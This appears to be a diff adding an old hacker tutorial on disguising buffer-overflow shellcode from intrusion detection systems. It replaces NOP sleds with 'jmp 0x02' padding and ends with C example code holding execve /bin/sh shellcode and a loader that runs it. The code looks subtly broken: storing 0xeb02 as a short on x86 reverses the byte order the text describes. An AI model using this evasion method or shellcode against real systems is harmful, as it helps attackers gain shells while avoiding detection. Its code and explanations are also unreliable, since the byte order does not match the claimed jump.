@@ -1,0 +1,75 @@
+                        --------------------------
+			Writing anti-IDS shellcode
+                        ==========================
+					By Xtremist (xtremist@2xs.co.il)
+Introduction :
+  	In the last few weeks i had made an intensive study of Intrusion -
+Detection Systems like snort. I found that several ways of escaping from 
+being detected while checking for vulnerable CGI's were already made by
+RFP (rfp@wiretrip.net). Also many other common intrusion tactics like 
+port-scanning was also escaped by using stealth-scanners like nmap. But
+I noticed that the IDS had also checked for a person trying to remotely
+buffer overflow a daemon. When I searched through the net for anti-IDS 
+tactics for escaping form being tracked, I found none. So i decided to 
+do a bit of thinking :).
+
+Detection :
+	IDS detect a cracker trying to smash the stack by analyzing the
+network trafic, and if they find a 0x90 (NOP), they report to the logs
+as penetration with the packet's details.
+
+Anti-IDS tactic:
+	The main problem here is the presence of NOP's in the shellcode.
+Exploits usually pad the stack with NOP's so that the return address
+dosent have to be exact. It is this NOP which is the problem. The main
+shellcode (which probably start execve or append a line to passwd) need
+not be changed because it dosent contain NOP's. The problem lies here -
+
+          for(i=0;i<(LEN-strlen(shellcode));i++){*(bof+i)=0x90;} 
+
+where the beginning of the stact gets padded with NOP's. NOP is used only
+to jump to the next instruction without any modification to execution of
+the assembly code. NOP=No OPeration. But the same function can be achieved
+by using a jump to the next instrucion (jmp 0x00).
+
+The Problems :
+	1) The jump instruction (0xeb 0x00) is two bytes unlike the NOP
+instruction which is only one byte. So the offset has to be more difficult
+to calculate because is the return address is in between 0xeb and 0x00
+then crash, boom, bang :).
+	2) A nice shellcode isn't supposed to consist of binary 0's and
+this one does (0x00).
+
+Solution : 
+	1) This is not really a problem. If the exploit dosent work we
+just have to add or subtract 1 from the offset since the jmp instruction
+is 2 bytes.
+	2) If we cannot jump one byte, we jump two bytes (jmp 0x02) and
+this does'nt have binary zero's and will work fine.
+
+Code: 
+	Replace this :
+		0x90
+	With this :
+		0xeb0x02
+
+Thanks to:
+	Mixter, for letting me know that there would be a problem of
+binary zero's if i had jumped and also for all the questions i asked :).
+
+Example code for x86:
+char sc[] =
+"\xeb\x1a\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3"
+"\x8d\x4e\x08\x8d\x56\x08\x31\xd2\xcd\x80\xe8\xe1\xff\xff\xff/bin/sh";
+char buf[256];
+
+int main() {
+  /* memset(buf,0x90,256); */
+  int i;
+
+  for (i = 0; i < 256; i += 2)
+    *(short *) &buf[i] = 0xeb02;
+  memcpy(buf + 256 - strlen(sc), sc, strlen(sc));
+  ((void (*)(void)) buf) ();
+  return 0;
+}
